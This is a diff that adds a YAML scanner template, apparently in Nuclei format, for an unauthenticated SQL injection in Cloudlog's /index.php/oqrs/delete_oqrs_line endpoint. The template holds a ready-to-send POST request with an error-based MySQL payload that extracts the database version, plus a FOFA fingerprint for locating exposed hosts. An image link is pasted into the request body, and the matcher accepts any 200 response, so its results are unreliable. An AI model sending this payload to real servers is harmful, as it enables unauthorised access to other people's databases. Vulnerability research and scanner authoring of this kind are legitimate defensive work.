@@ -1,0 +1,31 @@
+id: poc-ltnp2boyty7xfgn8
+info:
+  name: Cloudlog delete_oqrs_line 未授权SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ltnp2boyty7xfgn8'
+  tags: sqli,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ltnp2boyty7xfgn8
+    fofa: icon_hash="-460032467"
+http:
+- raw:
+  - 'POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+    id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1729347115695-53efcf21-c543-4e16-b2f5-3a4d7a232519.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
